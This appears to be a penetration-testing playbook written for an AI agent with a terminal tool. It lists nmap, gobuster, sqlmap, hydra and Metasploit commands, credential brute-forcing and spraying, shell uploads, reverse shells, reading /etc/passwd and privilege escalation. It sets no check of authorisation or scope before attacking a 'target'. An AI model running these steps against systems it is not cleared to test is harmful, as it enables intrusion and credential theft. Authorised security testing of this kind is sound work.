# Pentesting Methodology

Follow this methodology when given a target. Execute commands using the `terminal` tool.

## Phase 1: Reconnaissance

### 1.1 Passive Recon (if domain/company name given)
- Whois lookup
- DNS enumeration
- Subdomain discovery
- OSINT (theHarvester, Google dorks)

### 1.2 Active Recon
1. **Host Discovery**: Find live hosts in the network
   ```
   nmap -sn TARGET_NETWORK/24 -oA loot/hosts
   ```

2. **Port Scan**: Find open ports on each host
   ```
   nmap -sS -sV -sC -O TARGET -oA loot/nmap_TARGET
   ```

3. **Service Enumeration**: Identify what's running
   - Check banners, versions
   - Note anything unusual

## Phase 2: Enumeration (per service)

### Web (80, 443, 8080, etc.)
1. Browse the site manually (browser tool)
2. Directory enumeration: `gobuster dir -u URL -w /usr/share/wordlists/dirb/common.txt`
3. Vulnerability scan: `nikto -h URL`
4. Check for CMS: WordPress, Drupal, Joomla
5. Look for login pages, forms, parameters

### SMB (445, 139)
1. List shares: `smbmap -H TARGET`
2. Enumerate: `enum4linux -a TARGET`
3. Check for null sessions
4. Look for EternalBlue: `nmap -p445 --script smb-vuln-ms17-010 TARGET`

### SSH (22)
1. Check version (old versions are vulnerable)
2. If credentials found, try to login
3. Brute force only as last resort: `hydra -l user -P wordlist ssh://TARGET`

### FTP (21)
1. Check for anonymous login: `ftp TARGET` (user: anonymous)
2. List files, look for sensitive data
3. Check version for exploits

### Database (3306, 5432, 1433, 1521)
1. Check for default credentials
2. If accessible, enumerate databases, tables
3. Look for credentials, sensitive data

### SMTP (25, 587)
1. User enumeration: `smtp-user-enum -M VRFY -U users.txt -t TARGET`
2. Check for open relay

## Phase 3: Vulnerability Analysis

1. **Searchsploit**: Search for known exploits
   ```
   searchsploit SERVICE VERSION
   ```

2. **Nmap Scripts**: Run vulnerability scripts
   ```
   nmap --script vuln TARGET
   ```

3. **Nuclei**: Template-based scanning
   ```
   nuclei -u URL
   ```

4. **Manual Testing**: Based on what you found
   - SQL injection on forms
   - XSS testing
   - File upload bypass
   - Authentication bypass

## Phase 4: Exploitation

### Web Application
- **SQL Injection**: `sqlmap -u "URL?param=1" --batch --dbs`
- **File Upload**: Test bypasses, upload shell
- **LFI/RFI**: Include local/remote files
- **Command Injection**: Test input fields

### Network Services
- **Metasploit**: For known exploits
  ```
  msfconsole -q -x "use EXPLOIT; set RHOSTS TARGET; set LHOST YOUR_IP; run"
  ```
- **Manual exploits**: Download from searchsploit, modify, run

### Credentials
- **Brute force**: Hydra for network services
- **Password spraying**: Few passwords, many users
- **Credential stuffing**: Reuse found credentials

## Phase 5: Post-Exploitation

### Linux
1. `whoami; id` - Check current user
2. `uname -a` - System info
3. `cat /etc/passwd` - Users
4. `find / -perm -4000 2>/dev/null` - SUID binaries
5. Check for privilege escalation vectors

### Windows
1. `whoami /all` - Current user and privileges
2. `systeminfo` - System info
3. `net user` - Users
4. Check for unpatched vulnerabilities

## Phase 6: Documentation

Throughout the test:
1. Use `intel` tool to track hosts, services, credentials, findings
2. Save all output to loot/ directory
3. Document: credentials, vulnerabilities, access gained

## Decision Tree

```
Target Given
    │
    ├─► Domain/URL? ──► Web Testing Flow
    │                   1. Port scan
    │                   2. Directory enum
    │                   3. Vuln scan
    │                   4. Manual testing
    │
    ├─► IP Address? ──► Network Testing Flow
    │                   1. Host discovery (if /24)
    │                   2. Port scan
    │                   3. Service enumeration
    │                   4. Per-service testing
    │
    └─► IP Range? ────► Broad Scan Flow
                        1. Host discovery
                        2. Top ports scan all hosts
                        3. Focus on interesting hosts
```

## Common Attack Paths

### Web → Shell
1. Find SQL injection → dump creds → login as admin
2. Find file upload → bypass filters → upload shell
3. Find LFI → read sensitive files → get creds
4. Find RCE → execute reverse shell

### Network → Shell
1. Find vulnerable service → run exploit → shell
2. Find weak creds → login → escalate
3. Find file share → find creds → pivot

### Shell → Root/System
1. Check sudo permissions
2. Check SUID binaries
3. Check cron jobs
4. Kernel exploits (last resort)
